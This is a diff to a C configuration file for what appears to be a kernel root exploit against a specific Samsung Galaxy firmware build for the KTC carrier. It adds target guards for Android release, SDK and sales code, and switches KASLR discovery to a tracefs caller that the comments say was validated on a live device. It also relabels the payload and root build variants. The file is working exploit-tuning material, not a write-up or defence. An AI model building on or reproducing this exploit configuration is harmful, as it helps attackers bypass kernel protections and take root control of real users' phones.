@@ -1,8 +1,8 @@
 /*
- * SM-S928N / S928NKSU6EZIF offline candidate.
+ * SM-S928N / S928NKSU6EZIF KTC candidate.
  * Structure fields and symbol offsets are derived from the exact EZIF
- * boot image. Runtime placement is a separate, unverified candidate.
- * This is not a device-validated profile.
+ * boot image. KASLR discovery through tracefs was validated on the live
+ * KTC device; the full root route still requires on-device validation.
  */
 #include "ezif_layout.h"
 
@@ -15,12 +15,18 @@
 #define TARGET_GUARD_KERNEL \
   "6.1.162-android14-11-34343818-abS928NKSU6EZIF"
 #define TARGET_GUARD_PATCH "2026-09-05"
+#define TARGET_GUARD_ANDROID_RELEASE "17"
+#define TARGET_GUARD_SDK "37"
+#define TARGET_GUARD_SALES_CODE "KTC"
 #define TARGET_GUARD_ATTEMPT_LIMIT 24
 #define APP_REQUIRE_FRESH_P0_SESSION 0
 /* Prefer the exact tracefs caller when accessible, but the app SELinux domain
  * cannot read that event on the live phone.  Fall back to the physical P0
  * scan using the exact EZIF ABL/DTB-derived load address and fingerprint. */
-#define APP_EZIF_TRACEFS_ONLY 0
+/* The KTC device exposes sched_blocked_reason through tracefs to the shell
+ * domain. Use that exact caller for KASLR instead of repeatedly losing the
+ * physical-P0 reclaim lottery. Fail closed if tracefs is unavailable. */
+#define APP_EZIF_TRACEFS_ONLY 1
 #define APP_S928_ROUTE_DIAG 1
 /* The pselect fdsets are backed by an unarmed timerfd. A timeout is not
  * evidence that the PI write failed; let the existing FOPS readback decide. */
@@ -143,7 +149,7 @@
 
 #undef BUILD_VARIANT_LABEL
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define BUILD_VARIANT_LABEL "e3q-S928NKSU6EZIF-payload-v1.2-restore-on-fail"
+#define BUILD_VARIANT_LABEL "e3q-S928NKSU6EZIF-KTC-payload-v1.3-tracefs"
 #else
 #define BUILD_VARIANT_LABEL "e3q-S928NKSU6EZIF-root-umh"
 #endif
